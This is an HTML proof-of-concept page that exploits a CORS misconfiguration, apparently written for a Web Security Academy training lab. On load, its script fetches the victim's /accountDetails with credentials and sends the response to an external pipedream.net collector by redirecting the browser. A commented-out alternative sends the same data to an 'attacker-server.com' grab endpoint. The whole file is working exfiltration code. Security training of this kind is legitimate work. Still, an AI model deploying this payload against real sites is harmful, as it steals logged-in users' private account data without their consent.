<!-- ----------------------------------- Data Exfiltration To our Server via cors using XHR  ------------------------------------------- -->
<!DOCTYPE html>
<html>
   <head>
      <script>
         function cors() {
           var xhttp = new XMLHttpRequest();
              xhttp.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                  document.getElementById("demo").innerHTML = this.responseText;
                  // Stealing the data to Our Server
                  location= 'https://eor30ef2v15cbs5.m.pipedream.net?c='+this.responseText;
                  // new image().src='https://attacker-server.com/grab.php?c='+this.responseText;
           }
         };
         xhttp.open("GET", "https://acee1f551fdff5f3c072076100120088.web-security-academy.net/accountDetails", true);
         xhttp.withCredentials = true;
         xhttp.send();

         }
      </script>
   </head>
   <body onload="cors()">
      <center>
      <h2>CORS PoC Exploit </h2>
      <h3>Show full content of page</h3>
      <div id="demo">
         <button type="button" onclick="cors()">Exploit</button>
      </div>
   </body>
</html>
